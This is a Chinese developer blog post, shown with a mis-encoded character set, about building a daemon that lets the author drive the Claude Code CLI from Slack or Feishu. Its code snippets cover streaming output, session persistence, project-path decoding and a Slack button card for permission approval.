    åˆ®æ¶‚å±‚_èµ¢å¤§å¥–
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T09:31:14.000Z" title="Wed Jan 28 2026 09:31:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æˆ‘æŠŠ Claude Code æ¬è¿›äº† Slackï¼Œä»æ­¤è¹²å‘ä¹Ÿèƒ½ Vibe Coding</h2>
<blockquote>
<p>å‘¨æœ«ä¸¤å¤©è‚å‡ºä¸€ä¸ªå·¥å…·ï¼Œè®© AI å¸®æˆ‘å¹²æ´»ï¼Œæˆ‘åœ¨ Slack é‡ŒæŒ‡æŒ¥å°±è¡Œ</p>
</blockquote>
<h3 data-id="heading-1">ğŸ¤” èµ·å› ï¼šä¸€æ¬¡æ·±åˆ»çš„å•æ‰€æ²‰æ€</h3>
<p>é‚£æ˜¯ä¸€ä¸ªæ™®é€šçš„ä¸‹åˆï¼Œæˆ‘æ­£åœ¨ç”µè„‘å‰å’Œ Claude Code æ„‰å¿«åœ° vibe codingã€‚éœ€æ±‚èŠç€èŠç€ï¼Œä»£ç å†™ç€å†™ç€ï¼Œçªç„¶ï¼Œè‚šå­ä¸€é˜µç¿»æ¶Œ â€”â€” è¯¥å»è§£å†³äººç”Ÿå¤§äº‹äº†ã€‚</p>
<p>ååœ¨é©¬æ¡¶ä¸Šï¼Œæˆ‘ä¹ æƒ¯æ€§åœ°æå‡ºæ‰‹æœºåˆ·äº†ä¼šå„¿ã€‚åˆ·ç€åˆ·ç€çªç„¶æƒ³èµ·æ¥ï¼šå§æ§½ï¼Œåˆšæ‰è®© Claude æ”¹çš„é‚£ä¸ªå‡½æ•°ï¼Œæˆ‘è¿˜æ²¡ç¡®è®¤å‘¢ï¼Œå®ƒç°åœ¨åœ¨å¹²å˜›ï¼Ÿ</p>
<p>æ›´è¦å‘½çš„æ˜¯ï¼Œæˆ‘è¿˜æƒ³ç»§ç»­å’Œå®ƒèŠï¼Œè®©å®ƒæŠŠå‰©ä¸‹çš„é€»è¾‘ä¹Ÿå†™äº†ã€‚ä½†æ˜¯... <strong>æˆ‘åœ¨å•æ‰€å•Šï¼</strong></p>
<p>æˆ‘ç›¯ç€æ‰‹æœºå±å¹•é™·å…¥äº†æ²‰æ€ï¼š</p>
<ul>
<li>å›å»ç»§ç»­ï¼Ÿâ€”â€” ä½†è¿™å¨è¿˜æ²¡è§£å†³å®Œ</li>
<li>ç”¨æ‰‹æœº SSHï¼Ÿâ€”â€” ä¸Šæ¬¡è¯•è¿‡ï¼Œvim åœ¨æ‰‹æœºä¸Šç®€ç›´æ˜¯é…·åˆ‘</li>
<li>å¹²ç­‰ç€ï¼Ÿâ€”â€” è¿™ä¹Ÿå¤ªæµªè´¹æ—¶é—´äº†</li>
</ul>
<p>å°±åœ¨è¿™ä¸ªå……æ»¡å“²å­¦æ„å‘³çš„æ—¶åˆ»ï¼Œä¸€ä¸ªæƒ³æ³•å‡»ä¸­äº†æˆ‘ï¼š</p>
<p><strong>ä¸ºä»€ä¹ˆæˆ‘ä¸èƒ½åœ¨æ‰‹æœºä¸Šç»§ç»­ vibe codingï¼Ÿ</strong></p>
<p>ç°åœ¨ AI ç¼–ç¨‹è¿™ä¹ˆç«ï¼ŒClaude Code é‚£ä¹ˆå¥½ç”¨ï¼Œå‡­ä»€ä¹ˆéå¾—ååœ¨ç”µè„‘å‰ï¼Ÿæˆ‘å°±ä¸èƒ½è¹²ç€å‘ï¼Œå‘æ¡æ¶ˆæ¯ï¼Œè®© Claude ç»§ç»­å¸®æˆ‘å¹²æ´»ï¼Ÿ</p>
<p>æƒ³åˆ°è¿™é‡Œï¼Œæˆ‘æ„Ÿè§‰è¿™å¨ğŸ’©éƒ½æ‹‰å¾—æ›´é¡ºç•…äº†ã€‚</p>
<p>è¯´å¹²å°±å¹²ã€‚</p>
<h3 data-id="heading-2">ğŸ’¡ æƒ³æ³•ï¼šè®© Claude Code æˆä¸ºæˆ‘çš„è¿œç¨‹å‘˜å·¥</h3>
<p>æ€è·¯å…¶å®å¾ˆç®€å•ï¼š</p>
<pre><code class="hljs language-rust" lang="rust">æˆ‘ (Slack) -<span class="hljs-punctuation">-&gt;</span> æ¶ˆæ¯ -<span class="hljs-punctuation">-&gt;</span> æœåŠ¡å™¨ -<span class="hljs-punctuation">-&gt;</span> Claude Code -<span class="hljs-punctuation">-&gt;</span> ä»£ç ä¿®æ”¹ -<span class="hljs-punctuation">-&gt;</span> ç»“æœè¿”å› -<span class="hljs-punctuation">-&gt;</span> Slack
</code></pre>
<p>æŠŠ Claude Code CLI åŒ…è£…æˆä¸€ä¸ªæœåŠ¡ï¼Œè·‘åœ¨æˆ‘çš„å¼€å‘æœåŠ¡å™¨ä¸Šï¼Œç„¶åé€šè¿‡ Slack è¿™ç±» IM å·¥å…·æ¥å’Œå®ƒå¯¹è¯ã€‚è¿™æ ·æˆ‘å°±å¯ä»¥ï¼š</p>
<ul>
<li>ğŸš½ è¹²å‘çš„æ—¶å€™ç»§ç»­ vibe coding</li>
<li>ğŸ“± èººåºŠä¸Šç”¨æ‰‹æœºæ”¹ä»£ç </li>
<li>ğŸš‡ åœ°é“ä¸Šå¤„ç†ç´§æ€¥ bug</li>
<li>ğŸœ åƒé¥­çš„æ—¶å€™è®© AI è·‘ç€ä»»åŠ¡</li>
</ul>
<p>æˆ‘ç»™å®ƒèµ·åå« <strong>Heimerdinger</strong> â€”â€” è‹±é›„è”ç›Ÿé‡Œé‚£ä¸ªå°çŸ®å­å‘æ˜å®¶ã€‚å› ä¸ºè¿™å·¥å…·å°±åƒæœ‰ä¸ªå°æœºå™¨äººå¸®ä½ å¹²æ´»ä¸€æ ·ã€‚</p>
<h3 data-id="heading-3">ğŸ—ï¸ æ¶æ„è®¾è®¡ï¼šè¸©è¿‡çš„ç¬¬ä¸€ä¸ªå‘</h3>
<h4 data-id="heading-4">æœ€åˆçš„è®¾æƒ³</h4>
<p>ä¸€å¼€å§‹æˆ‘æƒ³å¾—å¾ˆç®€å•ï¼š</p>
<ol>
<li>ç›‘å¬ Slack æ¶ˆæ¯</li>
<li>è°ƒç”¨ Claude CLI</li>
<li>æŠŠç»“æœå‘å›å»</li>
</ol>
<p>ä¸‰æ­¥èµ°ï¼Œå®Œäº‹å„¿ã€‚</p>
<h4 data-id="heading-5">ç°å®çš„æš´å‡»</h4>
<p>å®é™…åšçš„æ—¶å€™æ‰å‘ç°ï¼Œäº‹æƒ…æ²¡é‚£ä¹ˆç®€å•ï¼š</p>
<p><strong>é—®é¢˜ä¸€ï¼šClaude Code çš„è¾“å‡ºæ˜¯æµå¼çš„</strong></p>
<p>Claude ä¸æ˜¯ä¸€ä¸‹å­åå‡ºæ‰€æœ‰ç»“æœï¼Œè€Œæ˜¯ä¸€ä¸ªå­—ä¸€ä¸ªå­—å¾€å¤–è¹¦çš„ã€‚å¦‚æœæˆ‘ç­‰å®ƒå…¨éƒ¨è¾“å‡ºå®Œå†å‘ Slackï¼Œç”¨æˆ·ä½“éªŒä¼šå¾ˆå·® â€”â€” è¦ç­‰å¥½ä¹…æ‰èƒ½çœ‹åˆ°ç»“æœã€‚</p>
<p><strong>é—®é¢˜äºŒï¼šä¸€ä¸ª Slack workspace å¯èƒ½æœ‰å¤šä¸ªé¡¹ç›®</strong></p>
<p>ä¸åŒçš„é¢‘é“å¯èƒ½åœ¨èŠä¸åŒçš„é¡¹ç›®ï¼Œæˆ‘éœ€è¦è®°ä½"è¿™ä¸ªé¢‘é“æ­£åœ¨æ“ä½œå“ªä¸ªé¡¹ç›®"ã€‚</p>
<p><strong>é—®é¢˜ä¸‰ï¼šä¼šè¯è¿ç»­æ€§</strong></p>
<p>Claude Code æœ‰ä¼šè¯æ¦‚å¿µï¼ŒåŒä¸€ä¸ªä¼šè¯é‡Œå®ƒèƒ½è®°ä½ä¸Šä¸‹æ–‡ã€‚å¦‚æœæ¯æ¬¡éƒ½å¼€æ–°ä¼šè¯ï¼Œé‚£ç”¨æˆ·è¯´"æŠŠåˆšæ‰é‚£ä¸ªå‡½æ•°æ”¹ä¸€ä¸‹"ï¼ŒClaude æ ¹æœ¬ä¸çŸ¥é“"åˆšæ‰"æ˜¯å•¥ã€‚</p>
<h4 data-id="heading-6">æœ€ç»ˆæ¶æ„</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph daemon["hmdg daemon"]
        subgraph adapters["IM Adapters"]
            slack["Slack Adapter"]
            feishu["Feishu Adapter"]
            discord["Discord...&lt;br/&gt;(Future)"]
        end

        subgraph processor["Message Processor"]
            state["Session State&lt;br/&gt;Project State"]
        end

        claude["Claude Code CLI&lt;br/&gt;(streaming JSON)"]

        slack --&gt; processor
        feishu --&gt; processor
        discord --&gt; processor
        processor --&gt; claude
    end

    user["ğŸ“± ä½  (æ‰‹æœº/ç”µè„‘)"] &lt;--&gt; slack
    user &lt;--&gt; feishu
</code></pre>
<p>æˆ‘è®¾è®¡äº†ä¸€ä¸ª<strong>é€‚é…å™¨æ¨¡å¼</strong>ï¼ŒæŠŠä¸åŒ IM å¹³å°çš„å·®å¼‚å°è£…èµ·æ¥ã€‚è¿™æ ·ä»¥åæƒ³æ”¯æŒé£ä¹¦ã€Discord ä»€ä¹ˆçš„ï¼Œåªéœ€è¦å†™ä¸ªæ–° Adapter å°±è¡Œã€‚</p>
<h3 data-id="heading-7">ğŸ”§ æŠ€æœ¯å®ç°ï¼šç»†èŠ‚é‡Œå…¨æ˜¯é­”é¬¼</h3>
<h4 data-id="heading-8">1. æµå¼è¾“å‡ºçš„å¤„ç†</h4>
<p>Claude Code æ”¯æŒ <code>--output-format stream-json</code> å‚æ•°ï¼Œä¼šè¾“å‡º JSONL æ ¼å¼çš„æµå¼æ•°æ®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"assistant"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"è®©æˆ‘æ¥"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"assistant"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"è®©æˆ‘æ¥çœ‹çœ‹"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"assistant"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"è®©æˆ‘æ¥çœ‹çœ‹è¿™ä¸ªbug"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
</code></pre>
<p>æˆ‘éœ€è¦å®æ—¶è§£æè¿™äº› JSONï¼Œç„¶åæ›´æ–° Slack æ¶ˆæ¯ã€‚</p>
<p>ä½†è¿™é‡Œæœ‰ä¸ªå‘ï¼š<strong>Slack æœ‰ API é¢‘ç‡é™åˆ¶</strong>ã€‚</p>
<p>å¦‚æœæ¯æ”¶åˆ°ä¸€ä¸ª JSON å°±æ›´æ–°ä¸€æ¬¡æ¶ˆæ¯ï¼Œå¾ˆå¿«å°±ä¼šè¢«é™æµã€‚æ‰€ä»¥æˆ‘åšäº†ä¸ªèŠ‚æµå¤„ç†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// è‡³å°‘é—´éš” 1 ç§’æ‰æ›´æ–°ä¸€æ¬¡æ¶ˆæ¯</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MIN_UPDATE_INTERVAL</span> = <span class="hljs-number">1000</span>;
<span class="hljs-keyword">let</span> lastUpdateTime = <span class="hljs-number">0</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">throttledUpdate</span>(<span class="hljs-params">content: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
  <span class="hljs-keyword">if</span> (now - lastUpdateTime &gt;= <span class="hljs-variable constant_">MIN_UPDATE_INTERVAL</span>) {
    <span class="hljs-title function_">updateMessage</span>(content);
    lastUpdateTime = now;
  }
}
</code></pre>
<h4 data-id="heading-9">2. ä¼šè¯çŠ¶æ€ç®¡ç†</h4>
<p>è¿™æ˜¯æ•´ä¸ªé¡¹ç›®æœ€å¤æ‚çš„éƒ¨åˆ†ã€‚æˆ‘éœ€è¦ç»´æŠ¤ä¸‰å±‚çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ¯ä¸ªé¢‘é“å½“å‰é€‰æ‹©çš„é¡¹ç›®</span>
<span class="hljs-keyword">const</span> userStates = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">ChannelState</span>&gt;();

<span class="hljs-comment">// æ¯ä¸ªé¡¹ç›®æœ€åä½¿ç”¨çš„ä¼šè¯ ID</span>
<span class="hljs-keyword">const</span> projectSessions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;();

<span class="hljs-comment">// æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡ï¼ˆç”¨äºæ”¯æŒ /stop å‘½ä»¤ï¼‰</span>
<span class="hljs-keyword">const</span> activeExecutions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">ExecutionInfo</span>&gt;();
</code></pre>
<p>è€Œä¸”è¿™äº›çŠ¶æ€è¦æŒä¹…åŒ–ï¼Œä¸ç„¶æœåŠ¡é‡å¯å°±å…¨ä¸¢äº†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// çŠ¶æ€æŒä¹…åŒ–åˆ° ~/.heimerdinger/sessions-state.json</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">saveState</span>(<span class="hljs-params"/>) {
  fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-variable constant_">STATE_FILE</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
    <span class="hljs-attr">userStates</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(userStates),
    <span class="hljs-attr">projectSessions</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(projectSessions)
  }));
}
</code></pre>
<h4 data-id="heading-10">3. é¡¹ç›®å‘ç°æœºåˆ¶</h4>
<p>Claude Code ä¼šæŠŠé¡¹ç›®ä¿¡æ¯å­˜åœ¨ <code>~/.claude/projects/</code> ç›®å½•ä¸‹ï¼Œç›®å½•åæ˜¯é¡¹ç›®è·¯å¾„çš„ç¼–ç å½¢å¼ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">~<span class="hljs-regexp">/.claude/pr</span>ojects/
â”œâ”€â”€ home-dev-project-a/
â”œâ”€â”€ home-dev-<span class="hljs-keyword">my</span>-project/
â””â”€â”€ Users-test-<span class="hljs-keyword">my</span>-app/
</code></pre>
<p>ç¼–ç è§„åˆ™å¾ˆç®€å•ï¼šæŠŠ <code>/</code> æ›¿æ¢æˆ <code>-</code>ã€‚ä½†è§£ç å°±å¤´ç–¼äº†ã€‚</p>
<p>æ¯”å¦‚ <code>home-dev-my-project</code>ï¼Œå®ƒå¯èƒ½æ˜¯ï¼š</p>
<ul>
<li><code>/home/dev/my/project</code> â€”â€” 4 å±‚ç›®å½•</li>
<li><code>/home/dev/my-project</code> â€”â€” 3 å±‚ç›®å½•ï¼Œæœ€åä¸€å±‚æœ¬èº«å¸¦è¿å­—ç¬¦</li>
</ul>
<p><strong>æ²¡æ³•ç›´æ¥åŒºåˆ†å“ªä¸ª <code>-</code> æ˜¯åŸæ¥çš„ <code>/</code>ï¼Œå“ªä¸ªæ˜¯è·¯å¾„æœ¬èº«å°±æœ‰çš„ã€‚</strong></p>
<p>ä¸€å¼€å§‹æˆ‘æƒ³ç®€å•å¤„ç†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç®€å•ç²—æš´ï¼Œä½†æ˜¯é”™çš„</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">decodePath</span>(<span class="hljs-params">encoded: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-string">'/'</span> + encoded.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/-/g</span>, <span class="hljs-string">'/'</span>);
}
<span class="hljs-comment">// home-dev-my-project -&gt; /home/dev/my/project âŒ é”™ï¼</span>
</code></pre>
<p>åæ¥æƒ³åˆ°ä¸€ä¸ªåŠæ³•ï¼š<strong>ç©·ä¸¾æ‰€æœ‰å¯èƒ½çš„ç»„åˆï¼Œçœ‹å“ªä¸ªè·¯å¾„åœ¨æ–‡ä»¶ç³»ç»Ÿé‡ŒçœŸå®å­˜åœ¨</strong>ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">decodeProjectPath</span>(<span class="hljs-params">encodedPath: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">const</span> parts = encodedPath.<span class="hljs-title function_">split</span>(<span class="hljs-string">'-'</span>);  <span class="hljs-comment">// ['home', 'dev', 'my', 'project']</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">findValidPath</span>(<span class="hljs-string">''</span>, parts, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> result || <span class="hljs-string">`/<span class="hljs-subst">${encodedPath.replace(/-/g, <span class="hljs-string">'/'</span>)}</span>`</span>;  <span class="hljs-comment">// fallback</span>
}

<span class="hljs-comment">// é€’å½’ + å›æº¯ï¼Œå°è¯•æ‰€æœ‰å¯èƒ½çš„è·¯å¾„ç»„åˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">findValidPath</span>(<span class="hljs-params">current: <span class="hljs-built_in">string</span>, parts: <span class="hljs-built_in">string</span>[], index: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> {
  <span class="hljs-keyword">if</span> (index &gt;= parts.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">existsSync</span>(current) ? current : <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">// ä» index å¼€å§‹ï¼Œå°è¯•æŠŠè¿ç»­çš„ parts æ‹¼æˆä¸€ä¸ªç›®å½•å</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = index; i &lt; parts.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> segment = parts.<span class="hljs-title function_">slice</span>(index, i + <span class="hljs-number">1</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">'-'</span>);  <span class="hljs-comment">// 'my' æˆ– 'my-project'</span>
    <span class="hljs-keyword">const</span> newPath = <span class="hljs-string">`<span class="hljs-subst">${current}</span>/<span class="hljs-subst">${segment}</span>`</span>;

    <span class="hljs-keyword">if</span> (i === parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) {
      <span class="hljs-comment">// æœ€åä¸€æ®µäº†ï¼Œæ£€æŸ¥è·¯å¾„æ˜¯å¦å­˜åœ¨</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">existsSync</span>(newPath)) <span class="hljs-keyword">return</span> newPath;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// ç»§ç»­é€’å½’</span>
      <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">findValidPath</span>(newPath, parts, i + <span class="hljs-number">1</span>);
      <span class="hljs-keyword">if</span> (result) <span class="hljs-keyword">return</span> result;
    }
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œå¯¹äº <code>home-dev-my-project</code>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">å°è¯• /home/dev/my/project  â†’ <span class="hljs-built_in">existsSync</span>() = <span class="hljs-literal">false</span> âŒ
å°è¯• /home/dev/my-project  â†’ <span class="hljs-built_in">existsSync</span>() = <span class="hljs-literal">true</span>  âœ… æ‰¾åˆ°äº†ï¼
</code></pre>
<p>æœ¬è´¨å°±æ˜¯æš´åŠ›æœç´¢ï¼Œä½†å› ä¸ºç›®å½•å±‚çº§ä¸ä¼šå¤ªæ·±ï¼Œæ€§èƒ½å®Œå…¨å¯ä»¥æ¥å—ã€‚</p>
<p><strong>æœ‰æ—¶å€™æœ€ç¬¨çš„åŠæ³•å°±æ˜¯æœ€å¥½çš„åŠæ³•</strong></p>
<h4 data-id="heading-11">4. æƒé™ç³»ç»Ÿ</h4>
<p>Claude Code æœ‰æƒé™æ§åˆ¶ï¼Œæ‰§è¡ŒæŸäº›æ“ä½œéœ€è¦ç”¨æˆ·ç¡®è®¤ã€‚åœ¨ CLI é‡Œæ˜¯äº¤äº’å¼çš„ï¼Œä½†åœ¨ Slack é‡Œæ€ä¹ˆåŠï¼Ÿ</p>
<p>æˆ‘åšäº†ä¸ª<strong>äº¤äº’å¼å¡ç‰‡</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å½“ Claude éœ€è¦æƒé™æ—¶ï¼Œå‘é€ä¸€ä¸ªå¸¦æŒ‰é’®çš„å¡ç‰‡</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendPermissionCard</span>(<span class="hljs-params">channel: <span class="hljs-built_in">string</span>, tool: <span class="hljs-built_in">string</span>, input: <span class="hljs-built_in">any</span></span>) {
  <span class="hljs-keyword">await</span> slack.<span class="hljs-property">chat</span>.<span class="hljs-title function_">postMessage</span>({
    channel,
    <span class="hljs-attr">blocks</span>: [
      {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'section'</span>,
        <span class="hljs-attr">text</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'mrkdwn'</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">`ğŸ” *éœ€è¦æƒé™ç¡®è®¤*\nå·¥å…·: <span class="hljs-subst">${tool}</span>`</span> }
      },
      {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'actions'</span>,
        <span class="hljs-attr">elements</span>: [
          { <span class="hljs-attr">type</span>: <span class="hljs-string">'button'</span>, <span class="hljs-attr">text</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'plain_text'</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">'âœ… å…è®¸'</span> }, <span class="hljs-attr">action_id</span>: <span class="hljs-string">'approve'</span> },
          { <span class="hljs-attr">type</span>: <span class="hljs-string">'button'</span>, <span class="hljs-attr">text</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'plain_text'</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">'âŒ æ‹’ç»'</span> }, <span class="hljs-attr">action_id</span>: <span class="hljs-string">'deny'</span> }
        ]
      }
    ]
  });
}
</code></pre>
